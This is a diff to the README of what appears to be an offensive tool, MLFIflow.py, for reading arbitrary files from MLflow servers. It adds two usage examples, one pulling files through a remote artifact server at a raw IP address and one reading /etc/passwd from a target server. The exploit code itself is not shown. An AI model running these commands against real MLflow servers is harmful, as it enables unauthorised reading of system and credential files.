@@ -25,6 +25,16 @@ To specify a wordlist of files to download, use the -f flag:
 python MLFIflow.py -s http://127.0.0.1:5000 -f /path/to/wordlist.txt
 ```
 
+Read files from a remote artifact server:
+```bash
+python MLFIflow.py -s http://127.0.0.1:5000 -f /path/to/wordlist.txt --remote http://1.2.3.4
+```
+
+Read a specific file from the MLflow server:
+```bash
+python MLFIflow.py -s http://127.0.0.1:5000 -t /etc/passwd
+```
+
 ## Contributing
 
 Pull requests are welcome. For major changes, please open an issue first
